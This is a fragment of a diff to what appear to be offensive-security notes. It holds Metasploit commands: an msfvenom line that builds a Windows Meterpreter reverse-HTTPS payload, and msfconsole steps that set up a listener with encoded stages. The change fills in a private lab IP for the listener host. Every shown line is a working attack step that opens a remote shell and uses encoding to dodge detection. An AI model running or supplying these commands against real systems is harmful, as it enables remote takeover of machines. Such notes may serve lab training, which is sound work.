@@ -87,7 +87,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 EXI
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
-set lhost yourip
+set lhost 192.168.49.81
 set lport 443
 set enablestageencoding true
 set stageencoder x86/xor_dynamic
